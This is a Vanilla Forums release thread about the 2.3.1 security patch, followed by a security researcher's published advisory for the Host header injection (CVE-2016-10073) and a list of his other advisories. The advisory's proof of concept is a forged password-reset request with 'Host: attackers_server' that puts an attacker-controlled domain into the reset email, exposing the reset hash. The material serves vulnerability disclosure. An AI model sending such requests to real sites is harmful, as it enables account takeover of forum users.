[Sign In](/entry/signin?Target=discussion%2F33498%2Fcritical-security-release-vanilla-2-3-1) · [Register](/entry/register?Target=discussion%2F33498%2Fcritical-security-release-vanilla-2-3-1)

[Sign In](/entry/signin?Target=discussion%2F33498%2Fcritical-security-release-vanilla-2-3-1) · [Register](/entry/register?Target=discussion%2F33498%2Fcritical-security-release-vanilla-2-3-1)

[Categories](/categories)

[Discussions](/discussions)

[Activity](/activity)

[Best Of...](/bestof/everything)

[Sign In](/entry/signin?Target=discussion%2F33498%2Fcritical-security-release-vanilla-2-3-1) · [Register](/entry/register?Target=discussion%2F33498%2Fcritical-security-release-vanilla-2-3-1)
×

[Home](https://open.vanillaforums.com/)› [Releases](https://open.vanillaforums.com/categories/blog)

Discussion
 Critical security release: Vanilla 2.3.1

Author

Date within
1 day
3 days
1 week
2 weeks
1 month
2 months
6 months
1 year
 of
 Examples: Monday, today, last week, Mar 26, 3/26/04
Search

**HackerOne users**: Testing against this community violates our program's Terms of Service and will result in your **bounty being denied**.
# Critical security release: Vanilla 2.3.1

[![Linc](https://secure.gravatar.com/avatar/d5f886876a3d53a09bf39d7f74338e45/?default=https%3A%2F%2Fvanillicon.com%2F69800b5ef2d03cc428d1445d574993a6_100.png&rating=g&size=100)](https://open.vanillaforums.com/profile/Linc "Linc")[Linc](https://open.vanillaforums.com/profile/Linc)
Admin

[May 2017](https://open.vanillaforums.com/discussion/33498/critical-security-release-vanilla-2-3-1)
 edited May 2017   in [Releases](https://open.vanillaforums.com/categories/blog)

This upgrade includes:

* A **critical upgrade to the PHPMailer library** to prevent remote code execution.
* Mitigation of a medium-level exploit of the HTTP\_HOST header.
* Additional minor fixes I will detail in a comment.

BEFORE making this upgrade:

IF you run Vanilla in an environment where you explicitly declare HTTP\_HOST, for example:

* Many **nginx** server setups
* Using **Varnish**
* Using a **load balancer**

READ the new documentation about how to modify your install to accommodate (quoted below).

FAILURE to heed this will result in a BROKEN upgrade to Vanilla 2.3.1 to the point of it being *inaccessible* via the web.

If you're using a **default Apache** setup, you are very likely unaffected by this, and in fact the security patch herein is **for you most especially**.

I apologize for this ungainly preamble, but the public publication of a medium-severity exploit has forced this half-baked workaround out the door immediately.

[Download It Now](https://open.vanillaforums.com/addon/vanilla-core-2.3.1)

[Use the standard upgrade steps](https://github.com/vanilla/vanilla#upgrading)

If upgrading from 2.2 or earlier, [see the 2.3 release discussion](https://open.vanillaforums.com/discussion/32822/vanilla-2-3-is-now-available#latest).

If you have problems upgrading from 2.3, please report them immediately.

Note that neither of these vulnerabilities effected our cloud customers. I include this note because I know some cloud customers do follow this forum. I will explain further why that is in a comment.

> ## Advanced Handling of Headers
>
> To utilize advanced handling of request and networking headers, it is recommended you make the necessary modifications in a `bootstrap.before.php` file. You may need to create this file in your config folder, if it does not already exist. The contents of this file are executed at the very beginning of Vanilla's bootstrapping process.
>
> If, for example, you wanted to use the `Host` header from an incoming request to set the host Vanilla sees, you would add the following into `bootstrap.before.php`:
>
> ```
>     if (isset($_SERVER['HTTP_HOST'])) {
>         $_SERVER['SERVER_NAME'] = $_SERVER['HTTP_HOST'];
>     }
>
> ```
>
> This will overwrite the host set by the server with the value of the `Host` header. It is crucial to verify the validity of any such data. **If you cannot verify the hosts provided in these headers, do not attempt to use them.**

Permanent link to these new docs is here: [Advanced Handling of Headers](http://docs.vanillaforums.com/developer/backend/)

6

## Comments

* [![Linc](https://secure.gravatar.com/avatar/d5f886876a3d53a09bf39d7f74338e45/?default=https%3A%2F%2Fvanillicon.com%2F69800b5ef2d03cc428d1445d574993a6_100.png&rating=g&size=100)](https://open.vanillaforums.com/profile/Linc "Linc")[Linc](https://open.vanillaforums.com/profile/Linc)

  Admin

  [May 2017](/discussion/comment/247483/#Comment_247483)

  Just past noon (ET) we were contacted for comment about "vulnerabilities in Vanilla Forums that were apparently reported back in December" by a blog. We were linked to two vulnerabilities that were published sometime today on ExploitBox. We received no advanced warning of their publication. An article was published which **falsely** implied our cloud customers had open vulnerabilities and were at risk, which has since been amended.

  After spending several hours tracking down the relevant communications and talking to folks internally, this was our statement regarding the issue that explains the nature of the issues reported, why there was a delay in releasing fixes, and why cloud was not effected:

  > You've forwarded two published security vulnerabilities. This is the first we've been made aware of their publication. They both effect our free and open source product. Neither is currently present in our cloud service at vanillaforums.com, nor were they at the time of their publication.
  >
  > 1. A HTTP\_HOST vulnerability in Vanilla 2.3.
  > 2. A vulnerability in the version of PHPMailer bundled in Vanilla 2.3.
  >
  > Golunski contacted us December 22 regarding the HTTP\_HOST vulnerability (but did not disclose the specific workflow detailed in the publicly published report - it was discussed only in the abstract). We thanked him for his discretion and investigated the issue. On January 6, we responded with our findings and cautioned that it would take us some time to release a fix due to the complexity of unwinding the use of this server variable without breaking the myriad scenarios it can be used for in open source environments. In the interim, Golunski had expressed a more simplistic view of the issue and was openly impatient with us. We received no further communication from the researcher after our explanation and request for time, nor prior to its publication.
  >
  > While a developer was already assigned and working on a careful general-case fix, we are not ready to move forward with said fix and this publication has forced our hand. We will issue a new version that simply strips its use, making it inappropriate for some setups which will also likely confuse the messaging around its release. The HTTP\_HOST vulnerability never effected our cloud service.
  >
  > Golunski mentioned our PHPMailer library should be updated once in the middle of the communication chain about the HTTP\_HOST vulnerability over the holidays. It was filed as a developer issue and patched, but a workflow error on our part caused us to miss following thru with a new public release (it remained conflated with the unresolved HTTP\_HOST issue). We will expedite said release now, as we would have done had any followup been made by Golunski. Again, our cloud service was not vulnerable, having naturally received an update to PHPMailer last year as part of our transition to Composer-based dependencies.
  >
  > We believe these publications were hostile to the users of our free and open source software. Both the updated version of PHPMailer and the potentially breaking change to the use of HTTP\_HOST will shortly be made available in a new open source version, Vanilla 2.3.1. The same outcome could have been achieved with sufficient communication.

  7
* [![Linc](https://secure.gravatar.com/avatar/d5f886876a3d53a09bf39d7f74338e45/?default=https%3A%2F%2Fvanillicon.com%2F69800b5ef2d03cc428d1445d574993a6_100.png&rating=g&size=100)](https://open.vanillaforums.com/profile/Linc "Linc")[Linc](https://open.vanillaforums.com/profile/Linc)

  Admin

  [May 2017](/discussion/comment/247484/#Comment_247484)
   edited May 2017

  If you are using `master` branch from git, please note the HTTP\_HOST patch is **not** included in it yet. This is because we are still working on a nicer fix and/or our own internal systems have not yet been amended per the documentation above (a final decision about this hasn't been made yet).

  Anyone who is using these headers *safely* (as our cloud service is) can continue doing so without the patch included in 2.3.1. Anyone using `master` already had the remaining patches in this release.

  In any case, the worst scenario the researcher could come up with for this vulnerability was sending a password reset email to a user with the incorrect domain set in the (text) link, which is why it was graded as only "medium".

  5
* [![Linc](https://secure.gravatar.com/avatar/d5f886876a3d53a09bf39d7f74338e45/?default=https%3A%2F%2Fvanillicon.com%2F69800b5ef2d03cc428d1445d574993a6_100.png&rating=g&size=100)](https://open.vanillaforums.com/profile/Linc "Linc")[Linc](https://open.vanillaforums.com/profile/Linc)

  Admin

  [May 2017](/discussion/comment/247485/#Comment_247485)

  Other fixes that were queued for release that are now in 2.3.1:

  + Validate redirects during registration to prevent malicious redirection.
  + Upgrade importer's use of `mysql` module to `mysqli`.
  + Assign "Unconfirmed" role to new users if confirmation is required.
  + Update links and calls to vanillaforums.org (now open.vanillaforums.com).
  + Add xf12 password authentication method for XenForo imports.
  + Add support for 'sso' parameter redirects.
  + Remove dead link from writable config prompt during install.
  5
* [![Linc](https://secure.gravatar.com/avatar/d5f886876a3d53a09bf39d7f74338e45/?default=https%3A%2F%2Fvanillicon.com%2F69800b5ef2d03cc428d1445d574993a6_100.png&rating=g&size=100)](https://open.vanillaforums.com/profile/Linc "Linc")[Linc](https://open.vanillaforums.com/profile/Linc)

  Admin

  [May 2017](/discussion/comment/247486/#Comment_247486)
   edited May 2017

  The critical security flaw in PHPMailer was already **not** present in the 2.4 prerelease. If you are using 2.4a, you may continue doing so. To close the HTTP\_HOST flaw if you're not sanitizing HTTP\_HOST already (as described above), [see this patch](https://github.com/vanilla/vanilla/pull/5576/files) to make the fix yourself for now. We'll have an updated release soon.

  7
* [![Gillingham](https://us.v-cdn.net/5018160/uploads/userpics/913/nRG3D0TVI6Y3D.png)](https://open.vanillaforums.com/profile/Gillingham "Gillingham")[Gillingham](https://open.vanillaforums.com/profile/Gillingham)

  ✭

  [May 2017](/discussion/comment/247493/#Comment_247493)
   edited May 2017

  There seems to be no upgrade script in this release, /index.php?p=/utility/upgrade returns a view not found error.

  unzip -l 2ZCYQN977HZZ.zip | grep upgrade also results in nothing.

  Looks like this is maybe an outstanding issue after seeing <https://open.vanillaforums.com/discussion/33236/github-upgrading-instructions-are-incorrect#latest> , the responses there seem regardless the documentation is wrong here.

  0
* [![Linc](https://secure.gravatar.com/avatar/d5f886876a3d53a09bf39d7f74338e45/?default=https%3A%2F%2Fvanillicon.com%2F69800b5ef2d03cc428d1445d574993a6_100.png&rating=g&size=100)](https://open.vanillaforums.com/profile/Linc "Linc")[Linc](https://open.vanillaforums.com/profile/Linc)

  Admin

  [May 2017](/discussion/comment/247495/#Comment_247495)
   edited May 2017

  The endpoint `/utility/update` is canonical.

  I'm unclear why the `/utility/upgrade` alias is used in the docs and why it isn't functioning in 2.3, but the correct solution is always to use `/utility/update`. I've amended the README on master.

  1
* [![donovanb](https://us.v-cdn.net/5018160/uploads/userpics/641/n013RW2WIQHJ5.png)](https://open.vanillaforums.com/profile/donovanb "donovanb")[donovanb](https://open.vanillaforums.com/profile/donovanb)

  ✭

  [May 2017](/discussion/comment/247499/#Comment_247499)
   edited May 2017

  Can we ignore copying over the 'plugins' and 'themes' directory for this fix?

  0
* [![Linc](https://secure.gravatar.com/avatar/d5f886876a3d53a09bf39d7f74338e45/?default=https%3A%2F%2Fvanillicon.com%2F69800b5ef2d03cc428d1445d574993a6_100.png&rating=g&size=100)](https://open.vanillaforums.com/profile/Linc "Linc")[Linc](https://open.vanillaforums.com/profile/Linc)

  Admin

  [May 2017](/discussion/comment/247501/#Comment_247501)

  > [@donovanb](https://open.vanillaforums.com/profile/donovanb) said:
  >
  > Can we ignore copying over the 'plugins' and 'themes' directory for this fix?

  Yes.

  1
* [![donovanb](https://us.v-cdn.net/5018160/uploads/userpics/641/n013RW2WIQHJ5.png)](https://open.vanillaforums.com/profile/donovanb "donovanb")[donovanb](https://open.vanillaforums.com/profile/donovanb)

  ✭

  [May 2017](/discussion/comment/247503/#Comment_247503)

  Thx.. successful update. Just an FYI, make sure your file permissions are correct. I had to do:

  chmod -R g-w \*.php

  0
* [![donovanb](https://us.v-cdn.net/5018160/uploads/userpics/641/n013RW2WIQHJ5.png)](https://open.vanillaforums.com/profile/donovanb "donovanb")[donovanb](https://open.vanillaforums.com/profile/donovanb)

  ✭

  [May 2017](/discussion/comment/247504/#Comment_247504)

  Maybe OT.. but could you briefly describe 'Add support for 'sso' parameter redirects.'? thanks!

  0
* [![JasonBarnabe](https://lh4.googleusercontent.com/-gFNCNZyMfgY/AAAAAAAAAAI/AAAAAAAAADo/ErMklTHGPVI/photo.jpg)](https://open.vanillaforums.com/profile/JasonBarnabe "JasonBarnabe")[JasonBarnabe](https://open.vanillaforums.com/profile/JasonBarnabe)

  ✭✭

  [May 2017](/discussion/comment/247519/#Comment_247519)

  > [@Linc](https://open.vanillaforums.com/profile/Linc) said:
  >
  > IF you run Vanilla in an environment where you explicitly declare HTTP\_HOST, for example:
  >
  > + Many **nginx** server setups

  Can you elaborate on this point? Do you mean if I'm doing something special in my nginx config that uses HTTP\_HOST, or do you mean something that nginx may be doing without me having configured it?

  0
* [![Linc](https://secure.gravatar.com/avatar/d5f886876a3d53a09bf39d7f74338e45/?default=https%3A%2F%2Fvanillicon.com%2F69800b5ef2d03cc428d1445d574993a6_100.png&rating=g&size=100)](https://open.vanillaforums.com/profile/Linc "Linc")[Linc](https://open.vanillaforums.com/profile/Linc)

  Admin

  [May 2017](/discussion/comment/247525/#Comment_247525)

  > [@JasonBarnabe](https://open.vanillaforums.com/profile/JasonBarnabe) said:
  >
  > Can you elaborate on this point? Do you mean if I'm doing something special in my nginx config that uses HTTP\_HOST, or do you mean something that nginx may be doing without me having configured it?

  If you are blindly accepting the `HTTP_HOST` header from the request and setting it as a server variable, you are susceptible.

  If you are setting the `HTTP_HOST` server variable from a white list / manually to the correct value, you are not susceptible.

  If you have a default nginx installation and are unsure which category you fall in, assume you are in the former category and need this patch.

  0
* [![Linc](https://secure.gravatar.com/avatar/d5f886876a3d53a09bf39d7f74338e45/?default=https%3A%2F%2Fvanillicon.com%2F69800b5ef2d03cc428d1445d574993a6_100.png&rating=g&size=100)](https://open.vanillaforums.com/profile/Linc "Linc")[Linc](https://open.vanillaforums.com/profile/Linc)

  Admin

  [May 2017](/discussion/comment/247526/#Comment_247526)
   edited May 2017

  > [@donovanb](https://open.vanillaforums.com/profile/donovanb) said:
  >
  > Maybe OT.. but could you briefly describe 'Add support for 'sso' parameter redirects.'? thanks!

  Yes, I am tracking down what the change was with the developer who made it and will update this Monday.

  1
* [![review](https://secure.gravatar.com/avatar/f198c392193c117c7725831fef6f10ad/?default=https%3A%2F%2Fvanillicon.com%2Ff773255246836f01bf541f32c974fa37_100.png&rating=g&size=100)](https://open.vanillaforums.com/profile/review "review")[review](https://open.vanillaforums.com/profile/review)

  New

  [May 2017](/discussion/comment/247533/#Comment_247533)

  Does upgrading from 2.3 to 2.3.1 change the minimum php version from 5.4 to 5.6?

  2.3 says it requires 5.4 here <https://open.vanillaforums.com/discussion/32822/vanilla-2-3-is-now-available>

  but this page <https://github.com/vanilla/vanilla#upgrading> says 5.6

  0
* [![Linc](https://secure.gravatar.com/avatar/d5f886876a3d53a09bf39d7f74338e45/?default=https%3A%2F%2Fvanillicon.com%2F69800b5ef2d03cc428d1445d574993a6_100.png&rating=g&size=100)](https://open.vanillaforums.com/profile/Linc "Linc")[Linc](https://open.vanillaforums.com/profile/Linc)

  Admin

  [May 2017](/discussion/comment/247534/#Comment_247534)

  [@review](https://open.vanillaforums.com/profile/review) No, it does not. That is the requirement for the current `master` branch.

  0
* [![kopna](https://us.v-cdn.net/5018160/uploads/userpics/316/nUT0WVBE4BLY9.jpg)](https://open.vanillaforums.com/profile/kopna "kopna")[kopna](https://open.vanillaforums.com/profile/kopna)

  ✭

  [May 2017](/discussion/comment/247735/#Comment_247735)

  [@Linc](https://open.vanillaforums.com/profile/Linc)

  > This upgrade includes:

  ```
  A critical upgrade to the PHPMailer library to prevent remote code execution.
  Mitigation of a medium-level exploit of the HTTP_HOST header.
  Additional minor fixes I will detail in a comment.

  ```

  Is it possible to upgrade only that relating to the above? Or need a complete update of all files?

  Thank you.

  0
* [![R_J](https://us.v-cdn.net/5018160/uploads/userpics/892/nKYIPS43WB7I2.png)](https://open.vanillaforums.com/profile/R_J "R_J")[R\_J](https://open.vanillaforums.com/profile/R_J)

  Admin

  [May 2017](/discussion/comment/247736/#Comment_247736)

  You can download both versions: 2.3 and 2.3.1 and do a file by file comparison (use a tool like WinMerge for that). Although it would be possible that way to only update the files that have changed, there should be no reason to do so.

  The only reason would be that you have changed core files. If you did so, you should try your best to solve this problem as soon as possible.

  0
* [![kopna](https://us.v-cdn.net/5018160/uploads/userpics/316/nUT0WVBE4BLY9.jpg)](https://open.vanillaforums.com/profile/kopna "kopna")[kopna](https://open.vanillaforums.com/profile/kopna)

  ✭

  [May 2017](/discussion/comment/247746/#Comment_247746)

  > [@R\_J](https://open.vanillaforums.com/profile/R_J) написал:
  >
  > You can download both versions: 2.3 and 2.3.1 and do a file by file comparison (use a tool like WinMerge for that). Although it would be possible that way to only update the files that have changed, there should be no reason to do so.
  >
  > The only reason would be that you have changed core files. If you did so, you should try your best to solve this problem as soon as possible.

  Indeed, some files are different. I use vanilla 2.3 Does this mean that I can change only those files that have been updated in vanilla 2.3.1?

  Thank you

  0
* [![carol3](https://secure.gravatar.com/avatar/6466132bef1d07ac13b9f0f3ed93b5d5/?default=https%3A%2F%2Fvanillicon.com%2F7b56e5a3ebbdc75d534d0c54d6e6c495_100.png&rating=g&size=100)](https://open.vanillaforums.com/profile/carol3 "carol3")[carol3](https://open.vanillaforums.com/profile/carol3)

  New

  [June 2017](/discussion/comment/247925/#Comment_247925)

  I have the same thing here...

  0
* [![toolsmythe](https://us.v-cdn.net/5018160/uploads/userpics/657/nPZ2Z1LT6GQQ8.png)](https://open.vanillaforums.com/profile/toolsmythe "toolsmythe")[toolsmythe](https://open.vanillaforums.com/profile/toolsmythe)

  ✭

  [November 2017](/discussion/comment/250218/#Comment_250218)

  The Font/Background color chooser in the text editor doesn't actually do anything.

  Oddly, I just noticed as I type this that there's not even a menu choice for that in this forum.

  0

[Sign In](/entry/signin?Target=discussion%2F33498%2Fcritical-security-release-vanilla-2-3-1%3F) or [Register](/entry/register?Target=discussion%2F33498%2Fcritical-security-release-vanilla-2-3-1%3F) to comment.

#### Howdy, Stranger!

It looks like you're new here. Sign in or register to get started.

[Sign In](/entry/signin?Target=discussion%2F33498%2Fcritical-security-release-vanilla-2-3-1) [Register](/entry/register?Target=discussion%2F33498%2Fcritical-security-release-vanilla-2-3-1)
## Quick Links

* [Categories](/categories)
* [Recent Discussions](/discussions)
* [Activity](/activity)
* [Best Of...](/bestof/everything)
* [Unanswered](/discussions/unanswered)

#### Categories

* [All Categories](/categories)
* 1.3K Development
* [92 Releases](https://open.vanillaforums.com/categories/blog)
* [927 Community Addons & Development](https://open.vanillaforums.com/categories/developers)
* [276 Localization](https://open.vanillaforums.com/categories/localization)
* 3.6K Community Hub
* [108 Tutorials](https://open.vanillaforums.com/categories/tutorials)
* [1K General Banter](https://open.vanillaforums.com/categories/off-topic)
* [1.9K Feedback](https://open.vanillaforums.com/categories/feedback)
* 29.2K Versions
* [845 Vanilla 3.x Help](https://open.vanillaforums.com/categories/vanilla-3-0-help)

#### In this Discussion

* [November 2017 toolsmythe](https://open.vanillaforums.com/profile/toolsmythe)
* [June 2017 carol3](https://open.vanillaforums.com/profile/carol3)
* [May 2017 kopna](https://open.vanillaforums.com/profile/kopna)
* [May 2017 R\_J](https://open.vanillaforums.com/profile/R_J)
* [May 2017 Linc](https://open.vanillaforums.com/profile/Linc)
* [May 2017 review](https://open.vanillaforums.com/profile/review)
* [May 2017 JasonBarnabe](https://open.vanillaforums.com/profile/JasonBarnabe)
* [May 2017 donovanb](https://open.vanillaforums.com/profile/donovanb)
* [May 2017 Gillingham](https://open.vanillaforums.com/profile/Gillingham)

[Vanilla](https://www.higherlogic.com/vanilla-demo-request/)

Tired of hosting yourself? Upgrade to the Cloud!

[Learn More](https://www.higherlogic.com/vanilla-demo-request/)

© Vanilla Forums 2025

[Powered By Vanilla](https://vanilla.higherlogic.com/)



=== Content from twitter.com_e3041705_20250126_112801.html ===



=== Content from packetstormsecurity.com_5c4d28fb_20250125_194653.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from exploitbox.io_e289c878_20250126_112759.html ===


[Brand
![](../assets/img/logo.png)](../index.html)

* Stay Tuned

```

=============================================
- Discovered by: Dawid Golunski
- dawid[at]legalhackers.com
- <https://legalhackers.com>

- CVE-2016-10073
- Release date: 11.05.2017
- Revision 1.0
- Severity: Medium
=============================================

I. VULNERABILITY
-------------------------

Vanilla Forums <= 2.3 Host Header Injection CVE-2016-10073 [0day]

II. BACKGROUND
-------------------------

"Community Forums Reinvented
Create an online community that your customers will love. Vanilla's forum
software is used by top brands to engage customers, drive loyalty and reduce
support costs."

"Vanilla provides cloud and open source community forum software that powers
discussion forums worldwide with close to 1M downloads.
Built for flexibility and integration, Vanilla is the best, most powerful
community solution in the world."

<https://vanillaforums.com/en/software/>
<https://open.vanillaforums.com/>

III. INTRODUCTION
-------------------------

Vanilla Forums software (including the latest stable version of 2.3 in
its default configuration) is affected by:

* Host Header Injection CVE-2016-10073 (0day)

which can be exploited by unauthenticated remote attackers to potentially
intercept password reset hash and gain unauthorized access to the victim
account or perform web-cache poisoning attacks.

IV. DESCRIPTION
-------------------------

Vanilla Forums software, in its default configuration, makes use of
user-supplied HTTP HOST header (CVE-2016-10073) when sending emails
from the host on which the forum was installed.

The HOST header is used to form the sender email address as we can see
in the following snippet of code:

------[ library/core/class.email.php ]------

...

public function from($SenderEmail = '', $SenderName = '', $bOverrideSender = false) {
        if ($SenderEmail == '') {
            $SenderEmail = c('Garden.Email.SupportAddress', '');
            if (!$SenderEmail) {
                $SenderEmail = 'noreply@'.Gdn::request()->host();
            }
        }

        if ($SenderName == '') {
            $SenderName = c('Garden.Email.SupportName', c('Garden.Title', ''));
        }

        if ($this->PhpMailer->Sender == '' || $bOverrideSender) {
            $this->PhpMailer->Sender = $SenderEmail;
        }

        ob_start();
        $this->PhpMailer->setFrom($SenderEmail, $SenderName, false);
        ob_end_clean();
        return $this;
}

...

-----------------------------------------

As we can see by default, Vanilla will use the 'noreply@HOST' address where
HOST is obtained from the client HTTP request.

V. PROOF OF CONCEPT
-------------------------

An attacker may use HTTP HOST header to set the email domain to an arbitrary
host. For example. Sending the following HTTP request:

------------

POST /vanilla2-3/entry/passwordrequest HTTP/1.1
Host: attackers_server
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Connection: close
Content-Length: 149

hpt=&Target=discussions&ClientHour=2017-05-10+22%3A00&Email=victim&Request+a+new+password=Request+a+new+password&DeliveryType=VIEW&DeliveryMethod=JSON

------------

will result in the following email sent to the victim:

------------

To: victim@victim-server.com
Subject: [Vanilla 2.3] Reset Your Password
X-PHP-Originating-Script: 0:class.phpmailer.php
Date: Thu, 11 May 2017 09:42:13 +0000
Return-Path: noreply@attackers_server
Message-ID: <a989e3868a609316dd9a7d7a991d79e5@attackers_server>
X-Mailer: PHPMailer 5.1 (phpmailer.sourceforge.net)
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain; charset="utf-8"

Vanilla 2.3 [http://attackers_server/vanilla2-3/=0A=0A=0A=0AReset](http://attackers_server/vanilla2-3/%3D0A%3D0A%3D0A%3D0AReset) Your Passw=
ord=0A=0A=0A=0AWe've received a request to change your password at Vanilla =
2.3. If you didn't make this request, please ignore this email.=0A=0A=0A=0A=
Change My Password: [http://attackers_server/vanilla2-3/entry/passwordreset/=](http://attackers_server/vanilla2-3/entry/passwordreset/%3D)
2/PdNvqaPnnFaG

------------

Because of the HOST header set to:
Host: attackers_server

The resulting email will have the sender's address set to noreply@attackers_server.
The password reset link will also contain the attacker's server which could
allow the attacker to intercept the hash if the victim user clicked on the
malicious link.

VI. BUSINESS IMPACT
-------------------------

With victim user interaction, attacker could potentially intercept the password
reset hash.

This vulnerability may also lead to web-cache poisoning if the HOST header
is used to form links in web responses. See references for more details
on this vector.

VII. SYSTEMS AFFECTED
-------------------------

The latest stable release of Vanilla Forums available at the official website:

<https://open.vanillaforums.com/addon/vanilla-core-2.3>

was confirmed to be vulnerable.
Previous versions are also likely to be vulnerable.

This vulnerability can also be combined with CVE-2016-10033 vulnerability
to achieve Unauthenticated Remote Code Execution as described in a separate
advisory.

VIII. SOLUTION
-------------------------

This vulnerability was reported to Vanilla Forums support team in December
2016. Despite the acknowledgment of the issue by the team, it has remained
unpatched for over 5 months.
As there has been no progress or further updates, this advisory is finally
released to the public without an official patch.

IX. REFERENCES
-------------------------

<https://legalhackers.com>

<https://ExploitBox.io>

<https://twitter.com/Exploit_Box>

Vendor site:
<https://vanillaforums.com>

Confirmed vulnerable stable version of Vanilla Forums 2.3:
<https://open.vanillaforums.com/addon/vanilla-core-2.3>
<https://open.vanillaforums.com/discussion/32822/vanilla-2-3-is-now-available>

Vanilla Forums RCE 0day exploit:
<https://exploitbox.io/vuln/Vanilla-Forums-Exploit-RCE-0day-Remote-Code-Exec-CVE-2016-10033.html>

<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html>
<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>

Web-cache poisoning:
<http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html>

X. CREDITS
-------------------------

Discovered by

Dawid Golunski
dawid (at) legalhackers (dot) com

<https://legalhackers.com>
<https://ExploitBox.io>

XI. REVISION HISTORY
-------------------------

11.05.2017 - Advisory released, rev. 1

XII. LEGAL NOTICES
-------------------------

The information contained within this advisory is supplied "as-is" with
no warranties or guarantees of fitness of use or otherwise. I accept no
responsibility for any damage caused by the use or misuse of this information.

```

[![](../assets/img/logo.png)](https://ExploitBox.io)

**COMING SOON** **█**



=== Content from legalhackers.com_bd402dbf_20250126_112800.html ===


## LEGAL HACKERS

# Dawid Golunski

Information Security.

Security Research.

Legal/ethical Hacking.

Penetration Testing.

# Contact

![](static/email_sm.png) e-mail  >

![](static/twit.jpg) twitter > [@dawid\_golunski](https://twitter.com/%40dawid_golunski)

# Security advisories

Some of the released advisories can be found below:

1. [Git-LFS <= 2.12 Remote Code Execution (RCE) Vulnerability CVE-2020-27955](https://legalhackers.com/advisories/Git-LFS-RCE-Exploit-CVE-2020-27955.html)
2. [Wordpress 4.6 - Unauthenticated RCE Exploit (Remote Code Execution)](https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html)
3. [SquirrelMail <= 1.4.22 <= 1.4.23 Remote Code Execution (CVE-2017-7692)](./advisories/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html)
4. [Zend Framework / zend-mail < 2.4.11 Remote Code Execution (CVE-2016-10034)](./advisories/ZendFramework-Exploit-ZendMail-Remote-Code-Exec-CVE-2016-10034-Vuln.html)
5. [SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)](./advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html)
6. [PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045) (0day Patch Bypass/Exploit)](./advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html)
7. [PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)](./advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html)
8. [Nagios Core < 4.2.4 Root Privilege Escalation (CVE-2016-9566)](./advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html)
9. [Nagios Core < 4.2.2 Curl Command Injection / Code Execution (CVE-2016-9565 / CVE-2008-4796)](./advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html)
10. [Wget < 1.18 Access List Bypass / Race Condition (CVE-2016-7098)](./advisories/Wget-Exploit-ACL-bypass-RaceCond-CVE-2016-7098.html)
11. [Nginx (Debian-based + Gentoo distros) - Root Privilege Escalation (CVE-2016-1247)](./advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html)
12. [MySQL / MariaDB / Percona - Privilege Esc. / Race Condition (CVE-2016-6663 / CVE-2016-5616)](./advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html)
13. [MySQL / MariaDB / Percona - Root Privilege Escalation (CVE-2016-6664 / CVE-2016-5617)](./advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html)
14. [Apache Tomcat (RedHat-based distros) - Root Privilege Escalation (CVE-2016-5425)](./advisories/Tomcat-RedHat-Pkgs-Root-PrivEsc-Exploit-CVE-2016-5425.html)
15. [Apache Tomcat (Debian-based distros) <= 6/7/8 Root Privilege Escalation (CVE-2016-1240)](./advisories/Tomcat-DebPkgs-Root-Privilege-Escalation-Exploit-CVE-2016-1240.html)
16. [MySQL / MariaDB / Percona - Remote Root Code Execution / Privilege Esc. (0day) (CVE-2016-6662)](./advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html)
17. [Adobe ColdFusion <= 11 XML External Entity (XXE) Injection (CVE-2016-4264)](./advisories/Adobe-ColdFusion-11-XXE-Exploit-CVE-2016-4264.html)
18. [vBulletin <= 5.2.2 Preauth Server Side Request Forgery (SSRF) (CVE-2016-6483)](./advisories/vBulletin-SSRF-Vulnerability-Exploit.html)
19. [Wget < 1.18 Arbitrary File Upload / Remote Code Execution (CVE-2016-4971)](./advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.html)
20. [CakePHP Framework <= 3.2.4 IP Spoofing Vulnerability](./advisories/CakePHP-IP-Spoofing-Vulnerability.html)
21. [Exim <= 4.86.2 Local Root Privilege Escalation](./advisories/Exim-Local-Root-Privilege-Escalation.html)
22. [Google AdWords API PHP client library <= 6.2.0 PHP Code Execution](./advisories/Google-AdWords-PHP-Client-library-PHP-Code-Execution.html)
23. [Google AdWords API client libraries - XML eXternal Entity Injection (XXE)](./advisories/Google-AdWords-API-libraries-XXE-Injection-Vulnerability.html)
24. [eBay Magento <= 1.9.2.1 XML eXternal Entity Injection (XXE) on PHP FPM](./advisories/eBay-Magento-XXE-Injection-Vulnerability.html)
25. [eBay Magento <= 1.9.2.1 Unrestricted Cron Script (Potential Code Execution / DoS)](./advisories/eBay-Magento-Unrestricted-Cron-Script-Vulnerability.html)
26. [Kirby CMS <= 2.1.0 Authentication Bypass via Path Traversal](./advisories/KirbyCMS-Path-Traversal-Authentication-Bypass-Vulnerability.html)
27. [Kirby CMS <= 2.1.0 CSRF Content Upload and PHP Script Execution](./advisories/KirbyCMS-CSRF-PHP-File-Upload-Vulnerability.html)
